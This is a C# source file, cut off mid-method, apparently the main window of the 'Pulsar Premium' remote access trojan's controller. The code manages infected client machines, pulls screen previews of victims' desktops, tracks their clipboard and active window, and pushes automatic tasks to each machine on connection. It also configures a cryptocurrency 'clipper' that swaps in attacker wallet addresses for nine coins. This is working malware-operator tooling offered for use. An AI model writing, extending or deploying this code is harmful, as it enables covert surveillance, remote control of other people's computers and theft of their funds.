using Newtonsoft.Json;
using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Administration.Actions;
using Pulsar.Common.Messages.ClientManagement;
using Pulsar.Common.Messages.ClientManagement.UAC;
using Pulsar.Common.Messages.ClientManagement.WinRE;
using Pulsar.Common.Messages.FunStuff;
using Pulsar.Common.Messages.Monitoring.VirtualMonitor;
using Pulsar.Common.Messages.Preview;
using Pulsar.Common.Messages.QuickCommands;
using Pulsar.Common.Messages.UserSupport.MessageBox;
using Pulsar.Common.Messages.UserSupport.Website;
using Pulsar.Server.Controls;
using Pulsar.Server.Controls.Wpf;
using Pulsar.Server.Extensions;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Messages;
using Pulsar.Server.Models;
using Pulsar.Server.Networking;
using Pulsar.Server.Persistence;
using Pulsar.Server.Statistics;
using Pulsar.Server.Utilities;
using Pulsar.Server.Plugins;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Media.Imaging;
using ImageSource = System.Windows.Media.ImageSource;

namespace Pulsar.Server.Forms
{
    /// <summary>
    /// Defines how auto tasks should be executed when clients connect.
    /// </summary>
    public enum AutoTaskExecutionMode
    {
        /// <summary>
        /// Auto tasks run only once per client (based on client ID).
        /// </summary>
        OncePerClient,

        /// <summary>
        /// Auto tasks run every time a client connects.
        /// </summary>
        EveryConnection
    }

    public partial class FrmMain : Form
    {
        [DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
        public PulsarServer ListenServer { get; set; }

        private DiscordRPC.DiscordRPC _discordRpc;  // Added Discord RPC

        private const int STATUS_ID = 5;
        private const int CURRENTWINDOW_ID = 6;
        private const int USERSTATUS_ID = 7;

        private bool _titleUpdateRunning;
        private bool _processingClientConnections;
        private readonly ClientStatusHandler _clientStatusHandler;
        private readonly GetCryptoAddressHandler _getCryptoAddressHander;
        private readonly ClientDebugLog _clientDebugLogHandler;
        private readonly DeferredAssemblyHandler _deferredAssemblyHandler = new DeferredAssemblyHandler();
        private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();
        private readonly object _processingClientConnectionsLock = new object();
        private readonly object _lockClients = new object();
        private readonly object _offlineRefreshLock = new object();
        private readonly object _statsRefreshLock = new object();
        private bool _offlineRefreshPending;
        private bool _statsRefreshPending;
        private readonly HashSet<Client> _visibleClients = new HashSet<Client>();
        private readonly Dictionary<Client, ClientListEntry> _clientEntryMap = new();
        private readonly Dictionary<int, ImageSource> _flagImageCache = new();
        private bool _syncingSelection;
        private IReadOnlyList<OfflineClientRecord> _cachedOfflineClients = Array.Empty<OfflineClientRecord>();
        private PreviewHandler _previewImageHandler;
        private static readonly string PulsarStuffDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "PulsarStuff");
        private readonly string AutoTasksFilePath = Path.Combine(PulsarStuffDir, "autotasks.json");
        private readonly string NotificationStateFilePath = Path.Combine(PulsarStuffDir, "notifications.json");
        private readonly List<NotificationEntry> _notificationHistory = new();
        private readonly object _notificationLock = new();
        private Font _notificationUnreadFont;
        private Dictionary<string, AutoTaskBehavior> _autoTaskBehaviors = new(StringComparer.OrdinalIgnoreCase);
        private Dictionary<string, AutoTaskBehavior> _autoTaskBehaviorsByTitle = new(StringComparer.OrdinalIgnoreCase);
        private AutoTaskExecutionContext _currentAutoTaskContext;
        private readonly HashSet<string> _executedTaskClientCombinations = new HashSet<string>();

        // Plugin System Fields
        private PluginManager _pluginManager;
        private FrmPluginManager _pluginManagerForm;
        private ServerContext _serverContext;

        public FrmMain()
        {
            _clientStatusHandler = new ClientStatusHandler();
            _getCryptoAddressHander = new GetCryptoAddressHandler();
            _clientDebugLogHandler = new ClientDebugLog();
            RegisterMessageHandler();
            OfflineClientRepository.Initialize();
            OfflineClientRepository.ResetOnlineState();
            InitializeComponent();
            Text = $"Pulsar Premium - {ServerVersion.Display}";
            statsElementHost?.ShowLoading();
            heatMapElementHost?.ShowLoading();
            typeof(ListView).InvokeMember("DoubleBuffered",
                System.Reflection.BindingFlags.SetProperty | System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic,
                null, this.lstClients, new object[] { true });
            typeof(ListView).InvokeMember("DoubleBuffered",
                System.Reflection.BindingFlags.SetProperty | System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic,
                null, this.lstOfflineClients, new object[] { true });
            lstClients.Visible = false;
            wpfClientsHost.SelectionChanged += WpfClientsHost_SelectionChanged;
            wpfClientsHost.FavoriteToggled += WpfClientsHost_FavoriteToggled;
            DarkModeManager.ApplyDarkMode(this);
            RefreshClientTheme();
            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
            _discordRpc = new DiscordRPC.DiscordRPC(this);  // Initialize Discord RPC
            _discordRpc.Enabled = Settings.DiscordRPC;     // Sync with settings on startup

            tableLayoutPanel1.VisibleChanged += TableLayoutPanel1_VisibleChanged;

            addTaskToolStripMenuItem.DropDownItems.Clear();
            InitializeAutoTaskBehaviors();
            BuildAutoTaskMenu();

            InitializeSearch();
            InitializeNotificationTracking();
            
            // Initialize Plugin System
            InitializePlugins();
        }

        private void OnAddressReceived(object sender, Client client, string addressType)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(() => OnAddressReceived(sender, client, addressType)));
                return;
            }
        }

        private void OnLogReceived(object sender, Client client, string log)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(() => OnLogReceived(sender, client, log)));
                return;
            }
        }

        private void RegisterMessageHandler()
        {
            MessageHandler.Register(_clientDebugLogHandler);
            _clientDebugLogHandler.DebugLogReceived += OnLogReceived;
            MessageHandler.Register(_clientStatusHandler);
            _clientStatusHandler.StatusUpdated += SetStatusByClient;
            _clientStatusHandler.UserStatusUpdated += SetUserStatusByClient;
            _clientStatusHandler.UserActiveWindowStatusUpdated += SetUserActiveWindowByClient;
            _clientStatusHandler.UserClipboardStatusUpdated += SetUserClipboardByClient;
            MessageHandler.Register(_getCryptoAddressHander);
            _getCryptoAddressHander.AddressReceived += OnAddressReceived;
            MessageHandler.Register(_deferredAssemblyHandler);
        }

        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_clientDebugLogHandler);
            _clientDebugLogHandler.DebugLogReceived -= OnLogReceived;
            MessageHandler.Unregister(_clientStatusHandler);
            _clientStatusHandler.StatusUpdated -= SetStatusByClient;
            _clientStatusHandler.UserStatusUpdated -= SetUserStatusByClient;
            _clientStatusHandler.UserActiveWindowStatusUpdated -= SetUserActiveWindowByClient;
            _clientStatusHandler.UserClipboardStatusUpdated -= SetUserClipboardByClient;
            MessageHandler.Unregister(_getCryptoAddressHander);
            _getCryptoAddressHander.AddressReceived -= OnAddressReceived;
            MessageHandler.Unregister(_deferredAssemblyHandler);
        }

        public void UpdateWindowTitle()
        {
            if (_titleUpdateRunning) return;
            _titleUpdateRunning = true;
            try
            {
                this.BeginInvoke((MethodInvoker)delegate
                {
                    try
                    {
                        int selected = lstClients.SelectedItems.Count;
                        int connected = ListenServer?.ConnectedClients?.Length ?? 0;
                        string baseTitle = $"Pulsar Premium - {ServerVersion.Display}";
                        this.Text = (selected > 0)
                            ? $"{baseTitle} - Connected: {connected} [Selected: {selected}]"
                            : $"{baseTitle} - Connected: {connected}";
                    }
                    finally
                    {
                        _titleUpdateRunning = false;
                    }
                });
            }
            catch (Exception)
            {
                _titleUpdateRunning = false;
            }
        }

        private void InitializeServer()
        {
            X509Certificate2 serverCertificate;
#if DEBUG
            serverCertificate = new DummyCertificate();
#else
            if (!File.Exists(Settings.CertificatePath))
            {
                using (var certificateSelection = new FrmCertificate())
                {
                    while (certificateSelection.ShowDialog() != DialogResult.OK)
                    { }
                }
            }
            serverCertificate = new X509Certificate2(Settings.CertificatePath);
#endif
            ListenServer = new PulsarServer(serverCertificate);
            ListenServer.ServerState += ServerState;
            ListenServer.ClientConnected += ClientConnected;
            ListenServer.ClientDisconnected += ClientDisconnected;
        }

        private void StartConnectionListener()
        {
            try
            {
                var allPorts = new List<ushort> { Settings.ListenPort };
                if (Settings.ListenPorts != null)
                    allPorts.AddRange(Settings.ListenPorts);
                allPorts = allPorts.Distinct().ToList();

                if (allPorts.Count > 1)
                    ListenServer.ListenMany(allPorts, Settings.IPv6Support, Settings.UseUPnP);
                else
                    ListenServer.Listen(Settings.ListenPort, Settings.IPv6Support, Settings.UseUPnP);
            }
            catch (SocketException ex)
            {
                if (ex.ErrorCode == 10048)
                {
                    MessageBox.Show(this, "The port is already in use.", "Socket Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                else
                {
                    MessageBox.Show(this, $"An unexpected socket error occurred: {ex.Message}\n\nError Code: {ex.ErrorCode}\n\n", "Unexpected Socket Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                ListenServer.Disconnect();
            }
            catch (Exception)
            {
                ListenServer.Disconnect();
            }
        }

        private void AutostartListening()
        {
            if (Settings.AutoListen)
            {
                StartConnectionListener();
            }
        }

        public void EventLogVisability()
        {
            if (Settings.EventLog)
            {
                DebugLogRichBox.Visible = true;
                splitter1.Visible = true;
            }
            else
            {
                DebugLogRichBox.Visible = false;
                splitter1.Visible = false;
            }
        }

        public void RefreshClientGroups()
        {
            wpfClientsHost?.SetGroupByCountry(Settings.ShowCountryGroups);
            SortClientsByFavoriteStatus();
        }

        public void RefreshClientTheme()
        {
            wpfClientsHost?.ApplyTheme(Settings.DarkMode);
            statsElementHost?.ApplyTheme(Settings.DarkMode);
            heatMapElementHost?.ApplyTheme(Settings.DarkMode);
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            wpfClientsHost?.SetGroupByCountry(Settings.ShowCountryGroups);
            RefreshClientTheme();
            ApplyWpfSearchFilter();

            int accountTypeIndex = -1;
            for (int i = 0; i < lstClients.Columns.Count; i++)
            {
                if (lstClients.Columns[i] == hAccountType)
                {
                    accountTypeIndex = i;
                    break;
                }
            }

            if (accountTypeIndex >= 0)
            {
                lstClients.StretchColumnByIndex(accountTypeIndex);
            }

            EventLog("Welcome to Pulsar.", "info");
            InitializeServer();
            AutostartListening();
            EventLogVisability();
            notifyIcon.Visible = false;
            Favorites.LoadFavorites();

            LoadCryptoAddresses();

            BTCTextBox.TextChanged += CryptoTextBox_TextChanged;
            LTCTextBox.TextChanged += CryptoTextBox_TextChanged;
            ETHTextBox.TextChanged += CryptoTextBox_TextChanged;
            XMRTextBox.TextChanged += CryptoTextBox_TextChanged;
            SOLTextBox.TextChanged += CryptoTextBox_TextChanged;
            DASHTextBox.TextChanged += CryptoTextBox_TextChanged;
            XRPTextBox.TextChanged += CryptoTextBox_TextChanged;
            TRXTextBox.TextChanged += CryptoTextBox_TextChanged;
            BCHTextBox.TextChanged += CryptoTextBox_TextChanged;

            ClipperCheckbox.CheckedChanged += ClipperCheckbox_CheckedChanged2;

            lstClients.ColumnWidthChanging += lstClients_ColumnWidthChanging;

            LoadNotificationHistory();
            LoadAutoTasks();
            InitializeAutoTasksMenu();
            ScheduleOfflineListRefresh();
            ScheduleStatsRefresh();
        }

        private void InitializeAutoTasksMenu()
        {
            var separator = new ToolStripSeparator();
            TasksContextMenuStrip.Items.Add(separator);

            var executeAllMenuItem = new ToolStripMenuItem("Execute on All Clients")
            {
                Image = Properties.Resources.application_go,
                ToolTipText = "Execute auto tasks on all connected clients that haven't had them executed yet"
            };
            executeAllMenuItem.Click += (s, e) => ExecuteAutoTasksOnAllClients();
            TasksContextMenuStrip.Items.Add(executeAllMenuItem);

            var forceExecuteMenuItem = new ToolStripMenuItem("Force Execute on All Connected Clients")
            {
                Image = Properties.Resources.application_add,
                ToolTipText = "Force execute auto tasks on all connected clients, regardless of previous execution"
            };
            forceExecuteMenuItem.Click += (s, e) => ForceExecuteAutoTasksOnAllClients();
            TasksContextMenuStrip.Items.Add(forceExecuteMenuItem);

            var resetTrackingMenuItem = new ToolStripMenuItem("Reset Execution Tracking")
            {
                Image = Properties.Resources.refresh,
                ToolTipText = "Reset tracking so auto tasks will run on all clients again"
            };
            resetTrackingMenuItem.Click += (s, e) => ResetAutoTaskTracking();
            TasksContextMenuStrip.Items.Add(resetTrackingMenuItem);

            var separator2 = new ToolStripSeparator();
            TasksContextMenuStrip.Items.Add(separator2);

            var toggleModeMenuItem = new ToolStripMenuItem("Toggle Execution Mode")
            {
                Image = Properties.Resources.refresh,
                ToolTipText = "Toggle between 'Once Per Client' and 'Every Connection' for selected tasks"
            };
            toggleModeMenuItem.Click += (s, e) => ToggleSelectedTasksExecutionMode();
            TasksContextMenuStrip.Items.Add(toggleModeMenuItem);

            var aboutModesMenuItem = new ToolStripMenuItem("About Task Execution Modes")
            {
                Image = Properties.Resources.information,
                ToolTipText = "Learn about task execution modes"
            };
            aboutModesMenuItem.Click += (s, e) => ShowTaskExecutionModeDialog();
            TasksContextMenuStrip.Items.Add(aboutModesMenuItem);
        }

        private void lstClients_ColumnWidthChanging(object sender, ColumnWidthChangingEventArgs e)
        {
            if (e.ColumnIndex != hAccountType.Index)
            {
                lstClients.StretchColumnByIndex(hAccountType.Index);
            }
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            SaveNotificationHistory();
            SaveAutoTasks();

            ListenServer.Disconnect();
            UnregisterMessageHandler();
            if (_previewImageHandler != null)
            {
                MessageHandler.Unregister(_previewImageHandler);
                _previewImageHandler.Dispose();
            }
            _discordRpc.Enabled = false;  // Disable Discord RPC on close
            notifyIcon.Visible = false;
            notifyIcon.Dispose();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
        }

        public void EventLog(string message, string level)
        {
            try
            {
                if (DebugLogRichBox.InvokeRequired)
                {
                    DebugLogRichBox.Invoke(new Action(() => LogMessage(message, level)));
                }
                else
                {
                    LogMessage(message, level);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error in EventLog: {ex.Message}");
            }
        }

        private void LogMessage(string message, string level)
        {
            try
            {
                string timestamp = DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss");
                string formattedMessage = $"[{timestamp}] {message}";
                Color logColor = Color.DodgerBlue;

                switch (level.ToLower())
                {
                    case "normal":
                        if (Settings.DarkMode)
                            logColor = Color.White;
                        else
                            logColor = Color.Black;
                        break;

                    case "info":
                        logColor = Color.DodgerBlue;
                        break;

                    case "error":
                        logColor = Color.Red;
                        break;

                    default:
                        logColor = Color.DodgerBlue;
                        break;
                }

                int originalSelectionStart = DebugLogRichBox.SelectionStart;
                Color originalSelectionColor = DebugLogRichBox.SelectionColor;

                DebugLogRichBox.SelectionStart = DebugLogRichBox.TextLength;
                DebugLogRichBox.SelectionLength = 0;

                DebugLogRichBox.SelectionColor = logColor;

                DebugLogRichBox.AppendText(formattedMessage + Environment.NewLine);
                DebugLogRichBox.SelectionStart = DebugLogRichBox.TextLength;
                DebugLogRichBox.SelectionLength = 0;
                DebugLogRichBox.ScrollToCaret();

                DebugLogRichBox.SelectionStart = originalSelectionStart;
                DebugLogRichBox.SelectionColor = originalSelectionColor;
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error in LogMessage: {ex.Message}");
            }
        }

        private void TableLayoutPanel1_VisibleChanged(object sender, EventArgs e)
        {
            AdjustClientListViewSize();
        }

        private void AdjustClientListViewSize()
        {
            int targetWidth;
            if (tableLayoutPanel1.Visible)
            {
                targetWidth = this.ClientSize.Width - tableLayoutPanel1.Width;
            }
            else
            {
                targetWidth = this.ClientSize.Width;
            }

            lstClients.Width = targetWidth;
            if (wpfClientsHost != null)
            {
                wpfClientsHost.Width = targetWidth;
            }
        }

        private void lstClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            SyncWpfSelectionFromList();
            UpdateWindowTitle();

            var selectedClients = GetSelectedClients();
            if (selectedClients.Length == 1)
            {
                if (_previewImageHandler != null)
                {
                    MessageHandler.Unregister(_previewImageHandler);
                    _previewImageHandler.Dispose();
                }

                _previewImageHandler = new PreviewHandler(selectedClients[0], pictureBoxMain, clientInfoListView);
                MessageHandler.Register(_previewImageHandler);

                if (!chkDisablePreview.Checked)
                {
                    selectedClients[0].Send(new GetPreviewImage
                    {
                        Quality = 20,
                        DisplayIndex = 0
                    });
                }
            }
            else if (selectedClients.Length == 0)
            {
                pictureBoxMain.Image = Properties.Resources.nopreviewbest_cropped;
                clientInfoListView.Items.Clear();

                var defaultStats = new (string Label, string Value)[]
                {
                    ("CPU", "N/A"),
                    ("GPU", "N/A"),
                    ("RAM", "0 GB"),
                    ("Uptime", "N/A"),
                    ("Antivirus", "N/A"),
                    ("Default Browser", "N/A"),
                    ("Ping", "N/A"),
                    ("Webcam", "N/A"),
                    ("AFK Time", "N/A")
                };

                foreach (var (label, value) in defaultStats)
                {
                    var item = new ListViewItem(label);
                    item.SubItems.Add(value);
                    clientInfoListView.Items.Add(item);
                }
            }
        }

        private void ServerState(Networking.Server server, bool listening, ushort port)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    if (!listening)
                    {
                        lstClients.Items.Clear();
                        lstClients.Groups.Clear();
                        _visibleClients.Clear();
                        wpfClientsHost?.ClearClients();
                    }

                    string statusText;
                    var ports = (ListenServer?.GetListeningPorts() ?? Array.Empty<ushort>()).Distinct().ToList();

                    if (listening)
                    {
                        if (ports.Count <= 3)
                        {
                            statusText = $"Listening on ports {string.Join(", ", ports)}.";
                        }
                        else
                        {
                            var firstThree = ports.Take(3);
                            var remaining = ports.Count - 3;
                            statusText = $"Listening on ports {string.Join(", ", firstThree)} and {remaining} more ports.";
                        }
                    }
                    else
                    {
                        statusText = "Not listening.";
                    }

                    listenToolStripStatusLabel.Text = statusText;
                });
                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }

        private bool IsClientBlocked(string clientAddress)
        {
            string filePath = Path.Combine(PulsarStuffDir, "blocked.json");

            if (!Directory.Exists(PulsarStuffDir))
            {
                Directory.CreateDirectory(PulsarStuffDir);
            }

            if (!(File.Exists(filePath)))
            {
                return false;
            }

            try
            {
                string json = File.ReadAllText(filePath);
                var blockedIPs = JsonConvert.DeserializeObject<List<string>>(json);
                return blockedIPs.Contains(clientAddress.ToString());
            }
            catch (Exception)
            {
                return false;
            }
        }

        private void ClientConnected(Client client)
        {
            if (IsClientBlocked(client.EndPoint.Address.ToString()))
            {
                client.Send(new DoClientUninstall());
                EventLog("Blocked IP Attempted to connect " + client.EndPoint.Address, "error");
            }
            else
            {
                OfflineClientRepository.UpsertClient(client);
                ScheduleOfflineListRefresh();
                ScheduleStatsRefresh();
                lock (_clientConnections)
                {
                    if (!ListenServer.Listening) return;
                    _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, true));
                }

                lock (_processingClientConnectionsLock)
                {
                    if (!_processingClientConnections)
                    {
                        _processingClientConnections = true;
                        ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                    }
                }
                UpdateConnectedClientsCount();
            }
        }

        private void ClientDisconnected(Client client)
        {
            OfflineClientRepository.MarkClientOffline(client);
            ScheduleOfflineListRefresh();
            ScheduleStatsRefresh();
            lock (_clientConnections)
            {
                if (!ListenServer.Listening) return;
                _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, false));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }
            }

            UpdateConnectedClientsCount();
        }

        private bool _countUpdateRunning;

        private void UpdateConnectedClientsCount()
        {
            if (_countUpdateRunning) return;
            _countUpdateRunning = true;

            ThreadPool.QueueUserWorkItem(_ =>
            {
                try
                {
                    var count = ListenServer?.ConnectedClients?.Length ?? 0;
                    this.BeginInvoke((MethodInvoker)delegate
                    {
                        try
                        {
                            connectedToolStripStatusLabel.Text = $"Connected: {count}";
                        }
                        finally
                        {
                            _countUpdateRunning = false;
                        }
                    });
                }
                catch (Exception)
                {
                    _countUpdateRunning = false;
                }
            });
        }

        private void ProcessClientConnections(object state)
        {
            const int batchSize = 10; // up to 10 clients at once
            var batch = new List<KeyValuePair<Client, bool>>(batchSize);

            while (true)
            {
                batch.Clear();

                lock (_clientConnections)
                {
                    if (!ListenServer.Listening)
                    {
                        _clientConnections.Clear();
                    }

                    if (_clientConnections.Count == 0)
                    {
                        lock (_processingClientConnectionsLock)
                        {
                            _processingClientConnections = false;
                        }
                        RefreshStarButtons();
                        return;
                    }

                    while (batch.Count < batchSize && _clientConnections.Count > 0)
                    {
                        batch.Add(_clientConnections.Dequeue());
                    }
                }

                foreach (var client in batch)
                {
                    if (client.Key != null)
                    {
                        switch (client.Value)
                        {
                            case true:
                                AddClientToListview(client.Key);
                                ThreadPool.QueueUserWorkItem(_ => StartAutomatedTask(client.Key));
                                if (Settings.ShowPopup)
                                    ThreadPool.QueueUserWorkItem(_ => ShowPopup(client.Key));
                                break;

                            case false:
                                RemoveClientFromListview(client.Key);
                                break;
                        }
                    }
                }

                if (_clientConnections.Count > 0)
                {
                    Thread.Sleep(10);
                }
            }
        }

        private void StartAutomatedTask(Client client)
        {
            if (client == null)
            {
                return;
            }

            if (IsClientBlocked(client.EndPoint.Address.ToString()))
            {
                Debug.WriteLine("Blocked client, skipping automated tasks.");
                return;
            }

            string clientId = client.Value?.Id;
            if (string.IsNullOrEmpty(clientId))
            {
                Debug.WriteLine("Client ID is null or empty, skipping automated tasks.");
                return;
            }

            Debug.WriteLine($"Starting automated tasks for client {clientId}.");

            if (lstTasks.InvokeRequired)
            {
                lstTasks.Invoke(new Action(() => StartAutomatedTask(client)));
                return;
            }

            foreach (ListViewItem item in lstTasks.Items)
            {
                var task = ExtractAutoTask(item);
                if (task == null) continue;

                if (task.ExecutionMode == AutoTaskExecutionMode.OncePerClient)
                {
                    string taskClientKey = $"{task.Identifier}_{clientId}";
                    lock (_executedTaskClientCombinations)
                    {
                        if (_executedTaskClientCombinations.Contains(taskClientKey))
                        {
                            Debug.WriteLine($"Task '{task.Title}' already executed for client {clientId}, skipping.");
                            continue;
                        }
                        _executedTaskClientCombinations.Add(taskClientKey);
                    }
                    Debug.WriteLine($"Executing task '{task.Title}' for client {clientId} (OncePerClient mode).");
                }
                else
                {
                    Debug.WriteLine($"Executing task '{task.Title}' for client {clientId} (EveryConnection mode).");
                }

                if (!TryExecuteAutoTask(task, client))
                {
                    ExecuteLegacyAutoTask(task, client);
                }
            }
        }

        /// <summary>
        /// Executes auto tasks on all connected clients, respecting each task's execution mode.
        /// </summary>
        public void ExecuteAutoTasksOnAllClients()
        {
            if (lstTasks.Items.Count == 0)
            {
                MessageBox.Show("No auto tasks configured.", "Auto Tasks", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            var clientsProcessed = 0;

            lock (_lockClients)
            {
                foreach (ListViewItem item in lstClients.Items)
                {
                    if (item.Tag is Client client && client.Value != null)
                    {
                        ThreadPool.QueueUserWorkItem(_ => StartAutomatedTask(client));
                        clientsProcessed++;
                    }
                }
            }

            MessageBox.Show($"Auto tasks queued for {clientsProcessed} clients (respecting individual task execution modes).",
                           "Auto Tasks", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        /// <summary>
        /// Resets the tracking of which task-client combinations have been executed, allowing them to run again.
        /// </summary>
        public void ResetAutoTaskTracking()
        {
            lock (_executedTaskClientCombinations)
            {
                var count = _executedTaskClientCombinations.Count;
                _executedTaskClientCombinations.Clear();
                MessageBox.Show($"Auto task tracking reset for {count} task-client combinations. " +
                               "Tasks with 'Once Per Client' mode will now run again on all clients.",
                               "Auto Tasks", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        /// <summary>
        /// Forces auto tasks to execute on selected clients, regardless of whether they've been executed before.
        /// </summary>
        public void ForceExecuteAutoTasksOnSelectedClients()
        {
            var selectedClients = GetSelectedClients();
            if (selectedClients.Length == 0)
            {
                MessageBox.Show("Please select one or more clients first.", "Auto Tasks", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            if (lstTasks.Items.Count == 0)
            {
                MessageBox.Show("No auto tasks configured.", "Auto Tasks", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            foreach (var client in selectedClients)
            {
                ThreadPool.QueueUserWorkItem(_ =>
                {
                    Debug.WriteLine($"Force executing automated tasks for client {client.Value?.Id}.");

                    if (lstTasks.InvokeRequired)
                    {
                        lstTasks.Invoke(new Action(() =>
                        {
                            foreach (ListViewItem item in lstTasks.Items)
                            {
                                var task = ExtractAutoTask(item);
                                if (!TryExecuteAutoTask(task, client))
                                {
                                    ExecuteLegacyAutoTask(task, client);
                                }
                            }
                        }));
                    }
                    else
                    {
                        foreach (ListViewItem item in lstTasks.Items)
                        {
                            var task = ExtractAutoTask(item);
                            if (!TryExecuteAutoTask(task, client))
                            {
                                ExecuteLegacyAutoTask(task, client);
                            }
                        }
                    }
                });
            }

            MessageBox.Show($"Auto tasks queued for {selectedClients.Length} selected clients.",
                           "Auto Tasks", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        /// <summary>
        /// Forces auto tasks to execute on all connected clients, regardless of whether they've been executed before.
        /// </summary>
        public void ForceExecuteAutoTasksOnAllClients()
        {
            if (lstTasks.Items.Count == 0)
            {
                MessageBox.Show("No auto tasks configured.", "Auto Tasks", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            var clientsProcessed = 0;

            lock (_lockClients)
            {
                foreach (ListViewItem item in lstClients.Items)
                {
                    if (item.Tag is Client client && client.Value != null)
                    {
                        ThreadPool.QueueUserWorkItem(_ =>
                        {
                            // Force execute auto tasks without checking/updating the tracking
                            Debug.WriteLine($"Force executing automated tasks for client {client.Value?.Id}.");

                            if (lstTasks.InvokeRequired)
                            {
                                lstTasks.Invoke(new Action(() =>
                                {
                                    foreach (ListViewItem taskItem in lstTasks.Items)
                                    {
                                        var task = ExtractAutoTask(taskItem);
                                        if (!TryExecuteAutoTask(task, client))
                                        {
                                            ExecuteLegacyAutoTask(task, client);
                                        }
                                    }
                                }));
                            }
                            else
                            {
                                foreach (ListViewItem taskItem in lstTasks.Items)
                                {
                                    var task = ExtractAutoTask(taskItem);
                                    if (!TryExecuteAutoTask(task, client))
                                    {
                                        ExecuteLegacyAutoTask(task, client);
                                    }
                                }
                            }
                        });
                        clientsProcessed++;
                    }
                }
            }

            MessageBox.Show($"Auto tasks queued for {clientsProcessed} connected clients (forced execution).",
                           "Auto Tasks", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        /// <summary>
        /// Shows information about task execution modes and how to configure them.
        /// </summary>
        private void ShowTaskExecutionModeDialog()
        {
            string message = "Auto Task Execution Modes:\n\n" +
                           "• Once Per Client: Task runs only once per client (default)\n" +
                           "• Every Connection: Task runs every time a client connects\n\n" +
                           "To change a task's execution mode:\n" +
                           "1. Right-click on a task in the list\n" +
                           "2. Select 'Toggle Execution Mode'\n\n" +
                           "The execution mode is shown in the 'Arguments' column:\n" +
                           "- '[Once]' = Once Per Client\n" +
                           "- '[Every]' = Every Connection";

            MessageBox.Show(message, "Auto Task Execution Modes",
                           MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        /// <summary>
        /// Toggles the execution mode for selected tasks in the tasks list.
        /// </summary>
        private void ToggleSelectedTasksExecutionMode()
        {
            if (lstTasks.SelectedItems.Count == 0)
            {
                MessageBox.Show("Please select one or more tasks to toggle their execution mode.",
                               "Auto Tasks", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            var updatedCount = 0;
            foreach (ListViewItem item in lstTasks.SelectedItems)
            {
                var task = ExtractAutoTask(item);
                if (task != null)
                {
                    task.ExecutionMode = task.ExecutionMode == AutoTaskExecutionMode.OncePerClient
                        ? AutoTaskExecutionMode.EveryConnection
                        : AutoTaskExecutionMode.OncePerClient;

                    var newItem = CreateAutoTaskListViewItem(task);
                    var index = lstTasks.Items.IndexOf(item);
                    lstTasks.Items[index] = newItem;
                    lstTasks.Items[index].Selected = true;
                    updatedCount++;
                }
            }

            if (updatedCount > 0)
            {
                SaveAutoTasks();
                MessageBox.Show($"Execution mode toggled for {updatedCount} task(s).",
                               "Auto Tasks", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        public void SetToolTipText(Client client, string text)
        {
            if (client == null) return;

            try
            {
                lstClients.Invoke((MethodInvoker)delegate
                {
                    var item = GetListViewItemByClient(client);
                    if (item != null)
                    {
                        item.ToolTipText = text;
                        wpfClientsHost?.SetToolTip(client, text);
                    }
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        #region "Crypto Addresses"

        private void CryptoTextBox_TextChanged(object sender, EventArgs e)
        {
            UpdateCryptoAddressesJson();
        }

        private void ClipperCheckbox_CheckedChanged2(object sender, EventArgs e)
        {
            UpdateCryptoAddressesJson();
        }

        private void UpdateCryptoAddressesJson()
        {
            Dictionary<string, object> data = new Dictionary<string, object>();

            Dictionary<string, string> addresses = new Dictionary<string, string>
            {
                { "BTC", BTCTextBox.Text },
                { "LTC", LTCTextBox.Text },
                { "ETH", ETHTextBox.Text },
                { "XMR", XMRTextBox.Text },
                { "SOL", SOLTextBox.Text },
                { "DASH", DASHTextBox.Text },
                { "XRP", XRPTextBox.Text },
                { "TRX", TRXTextBox.Text },
                { "BCH", BCHTextBox.Text }
            };

            data["Addresses"] = addresses;
            data["ClipperEnabled"] = ClipperCheckbox.Checked;

            string json = JsonConvert.SerializeObject(data, Newtonsoft.Json.Formatting.Indented);
            string filePath = Path.Combine(PulsarStuffDir, "crypto_addresses.json");
            if (!Directory.Exists(PulsarStuffDir))
            {
